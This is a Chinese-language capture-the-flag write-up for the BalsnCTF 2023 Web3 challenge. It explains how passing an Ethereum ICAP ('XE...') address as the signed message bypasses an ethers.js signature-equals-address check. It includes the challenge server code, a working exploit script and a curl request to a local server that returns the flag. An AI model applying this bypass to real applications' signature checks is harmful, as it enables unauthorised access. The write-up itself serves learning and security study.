## Background
* [ethereumbook 第五章 密要、地址](https://cypherpunks-core.github.io/ethereumbook_zh/05.html)
    > 互換客戶端地址協議（ICAP）是一種部分與國際銀行帳號（IBAN）編碼兼容的以太坊地址編碼，為以太坊地址提供多功能，校驗和互操作編碼。ICAP地址可以編碼以太坊地址或通過以太坊名稱註冊表註冊的常用名稱。
    >
    >閱讀以太坊Wiki上的ICAP：https://github.com/ethereum/wiki/wiki/ICAP:-Inter-exchange-Client-Address-Protocol
    >
    >IBAN是識別銀行帳號的國際標準，主要用於電匯。它在歐洲單一歐元支付區（SEPA）及其以後被廣泛採用。IBAN是一項集中和嚴格監管的服務。ICAP是以太坊地址的分散但兼容的實現。
    >
    >一個IBAN由含國家程式碼，校驗和和銀行帳戶識別碼（特定國家）的34個字母數字字符（不區分大小寫）組成。
    >
    >ICAP使用相同的結構，通過引入代表“Ethereum”的非標準國家程式碼“XE”，後面跟著兩個字符的校驗和以及3個可能的帳戶識別碼變體

* [ethers.js 工具包 - getaddress](https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=getaddress#id14)
    > ```javascript
    > let address = "0xd115bffabbdd893a6f7cea402e7338643ced44a6";
    > let icapAddress = "XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI";
    > 
    >console.log(utils.getAddress(address));
    >// "0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6"
    >
    >console.log(utils.getAddress(icapAddress));
    >// "0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6"
    >
    >console.log(utils.getAddress(address, true));
    >// "XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI"
    >
    >console.log(utils.getAddress(icapAddress, true));
    >// "XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI"
    >```

* [Wallet Signer工具包](https://learnblockchain.cn/docs/ethers.js/api-wallet.html#signer)

* [ethers.js 工具包 - verifyMessage](https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=verifymessage#id18)
    > ```javascript
    > let signature = "0xddd0a7290af9526056b4e35a077b9a11b513aa0028ec6c9880948544508f3c63265e99e47ad31bb2cab9646c504576b3abc6939a1710afc08cbf3034d73214b81c";
    >
    >let signingAddress = Wallet.verifyMessage('hello world', signature);
    >
    >console.log(signingAddress);
    >// "0x14791697260E4c9A71f18484C9f997B308e59325"
    >```
## Source code
:::spoiler server.js
```javascript=
const express = require("express");
const ethers = require("ethers");
const path = require("path");

const app = express();

app.use(express.urlencoded());
app.use(express.json());

app.get("/", function(_req, res) {
  res.sendFile(path.join(__dirname + "/server.js"));
});

function isValidData(data) {
  if (/^0x[0-9a-fA-F]+$/.test(data)) {
    return true;
  }
  return false;
}

app.post("/exploit", async function(req, res) {
  try {
    const message = req.body.message;
    const signature = req.body.signature;
    if (!isValidData(signature) || isValidData(message)) {
      res.send("wrong data");
      return;
    }

    const signerAddr = ethers.utils.verifyMessage(message, signature);
    if (signerAddr === ethers.utils.getAddress(message)) {
      const FLAG = process.env.FLAG || "get flag but something wrong, please contact admin";
      res.send(FLAG);
      return;
    }
  } catch (e) {
    console.error(e);
    res.send("error");
    return;
  }

  res.send("wrong");
  return;
});

const port = process.env.PORT || 3000;
app.listen(port);
console.log(`Server listening on port ${port}`);

```
:::
## Recon
這一題是賽後解，因為太難了所以沒解出來，不過還是非常有趣的題目
1. Recon
仔細觀察soure code會發現，先用post到/exploit的route，然後帶message和signature的data，兩者都會受到檢查，也就是要符合signature=0xabcd...，而message就是一般的字元，所以看到#30~#31就會知道，這一題難的地方在於要想辦法找到一個message，他簽名後的錢包地址要和message本身一模一樣才會過條件拿到flag，也就是message也要是一個地址才行，但卻不能是0x開頭
2. 根據[^balsnctf-2023-web3-wp-maple]和[^ethers.js-tool-getAddress-example]的範例就會知道乙太錢包的地址有支援ICAP格式，簡單來說就是另外一種表示方式，一般錢包地址的表示都是採用hex的形式表示，但ICAP是以XE字節開頭表示地址，如下範例所示：
    ```javascript
    const ethers = require("ethers")
    const wallet = ethers.Wallet.createRandom()
    console.log(ethers.utils.getAddress(wallet.address))
    console.log(ethers.utils.getIcapAddress(wallet.address))

    # 0x7165ac4B3cb187CC37278919254db9e0867F1f26
    # XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM
    ```
3. 所以我們可以想如果直接拿地址的變形，也就是ICAP的地址當作我們的message，則簽名後得到的signAddress也一樣會是原本的錢包地址，而丟到getAddress的message因為本身就是地址，所以return的字串也會是一般以hex表示的錢包地址

### 原本的想法(一點都不重要)
直接暴力搜message簽完名後和message一樣
:::spoiler 爛扣
```javascript
const ethers = require("ethers");


const  generateRandomString = (num) => {
    let result1= Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,) + Math.random().toString(36).substring(2,);       
    console.log(result1.substring(0, num));
    return result1.substring(0, num);
}


async function signAndVerify() {
    let privateKey = "0x3141592653589793238462643383279502884197169399375105820974944592";
    let wallet = new ethers.Wallet(privateKey);
    
    try{
        while(true){
            message = generateRandomString(40);
            const signature = await wallet.signMessage(message);
            console.log(signature);
            console.log(ethers.utils.verifyMessage(message, signature));
            console.log('0x' + message);
            if (ethers.utils.verifyMessage(message, signature) === '0x' + message){
                console.log("Got it\nThe mssage is: ", message);
                break;
            }

            console.log("Nothing Yet");
        }
    } catch (error){
        console.log("Errror");
    }
}

signAndVerify();
```
:::
## Exploit
```javascript
const ethers = require("ethers")

const wallet = ethers.Wallet.createRandom()
console.log(ethers.utils.getAddress(wallet.address))
const icapAddress = ethers.utils.getIcapAddress(wallet.address)
console.log(icapAddress)

const message = icapAddress
const signature = wallet.signMessage(message)
console.log(message, signature)
```

```bash
$ node exp.js
0x7165ac4B3cb187CC37278919254db9e0867F1f26
XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM
XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM Promise {
  '0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b' }
$ node server.js    # 自己開service
$ curl -X POST localhost:3000/exploit --data 'message=XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM&signature=0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b'
get flag but something wrong, please contact admin%
```
因為是賽後解，所以就自己開service，但最後的結果確定可以拿到flag

Flag: `BALSN{Inter_Exchange_Client_Address_Protocol}`
## Reference
[^balsnctf-2023-web3-wp-maple]:[BalsnCTF 2023 - Web3 WP - maple](https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#web3)
[^ethers.js-tool-getAddress-example]:[ethers.js 工具包 - getaddress](https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=getaddress#id14)